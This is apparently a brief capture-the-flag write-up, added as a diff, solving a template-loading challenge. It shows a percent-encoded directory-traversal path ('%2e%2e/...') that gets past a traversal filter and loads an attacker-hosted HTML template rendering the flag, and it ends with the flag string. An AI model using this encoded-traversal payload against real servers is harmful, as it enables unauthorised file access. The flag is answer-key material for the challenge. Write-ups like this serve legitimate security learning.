@@ -1,0 +1,27 @@
+the code prevents directory traversal, but does not check for percent encoding, so we can just traverse directories using percent encoded periods. add an html file to some github repo:
+
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Example Theme</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    * {
+      font-family: sans-serif;
+    }
+  </style>
+</head>
+<body>
+<h1>{{ .Title }}</h1>
+<h2>{{ .Flag }}</h2>
+<p>{{ .Message }}</p>
+</body>
+</html>
+
+and point it to your file instead:
+
+%2e%2e/%2e%2e/%2e%2e/beepboop271/beepboop271/main/asdf
+
+ctf{g1thub_r3fus3d_t0_f1x_th1s_df537c87}
+
+(this doesn't feel like intended solve but whatever)
